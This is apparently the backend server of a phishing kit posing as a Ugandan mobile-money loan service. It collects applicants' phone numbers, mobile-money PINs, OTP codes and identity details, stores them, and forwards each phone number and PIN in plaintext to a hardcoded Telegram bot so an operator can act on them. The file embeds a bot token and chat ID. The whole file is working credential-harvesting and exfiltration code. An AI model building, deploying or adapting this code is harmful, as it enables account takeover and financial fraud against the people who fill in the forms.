const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration - UPDATED WITH NEW WORKING BOT
const TELEGRAM_BOT_TOKEN = '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg';
const TELEGRAM_CHAT_ID = '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database setup
const DB_PATH = '/tmp/loans.db';
let db = null;

async function initDatabase() {
    try {
        console.log('Initializing database at:', DB_PATH);
        db = await open({
            filename: DB_PATH,
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                total_payment INTEGER,
                interest INTEGER,
                otp_code TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT,
                full_name TEXT,
                national_id TEXT,
                date_of_birth TEXT,
                address TEXT,
                occupation TEXT,
                income TEXT,
                final_code TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
            );
        `);

        console.log('✅ Database initialized successfully');
        return true;
    } catch (error) {
        console.error('❌ Database error:', error);
        return false;
    }
}

// Send message to Telegram
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Telegram notification sent');
            return data.result.message_id;
        } else {
            console.error('Telegram error:', data);
        }
    } catch (error) {
        console.error('Telegram send error:', error);
    }
    return null;
}

function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Save loan application
app.post('/api/save-loan', async (req, res) => {
    try {
        console.log('Received save-loan request:', req.body);
        
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        if (!phone || !network || !amount) {
            return res.status(400).json({ success: false, error: 'Missing fields' });
        }
        
        const loanId = generateLoanId();
        console.log('Generated loan ID:', loanId);
        
        if (db) {
            await db.run(
                `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending']
            );
        }
        
        const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration / 30} months\n` +
            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
                    { text: "📱 Verify Device", callback_data: `verify_${loanId}` }
                ],
                [
                    { text: "📋 Already Applied", callback_data: `applied_${loanId}` },
                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
                ]
            ]
        };
        
        await sendTelegramMessage(messageText, replyMarkup);
        
        res.json({ success: true, loanId: loanId });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Webhook handler
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('Webhook received');
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const messageId = update.callback_query.message.message_id;
            const callbackId = update.callback_query.id;
            const [action, loanId] = callbackData.split('_');
            
            console.log(`Action: ${action}, LoanId: ${loanId}`);
            
            if (action === 'approve' && db) {
                await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        message_id: messageId,
                        text: `✅ <b>LOAN APPROVED</b>\n\nLoan ID: ${loanId}\nStatus: APPROVED`,
                        parse_mode: 'HTML'
                    })
                });
            }
            
            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: callbackId, text: "Done" })
            });
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// Get loan status
app.get('/api/loan/:loanId', async (req, res) => {
    try {
        if (!db) {
            return res.json({ success: true, loan: { status: 'pending' } });
        }
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
        res.json({ success: true, loan: loan || { status: 'pending' } });
    } catch (error) {
        res.json({ success: true, loan: { status: 'pending' } });
    }
});

// Serve HTML pages
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'verify.html')); });
app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });
app.get('/final-verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'final-verify.html')); });

// Start server
async function startServer() {
    await initDatabase();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`📱 Telegram Bot Ready with new token`);
    });
}

startServer();
EOF
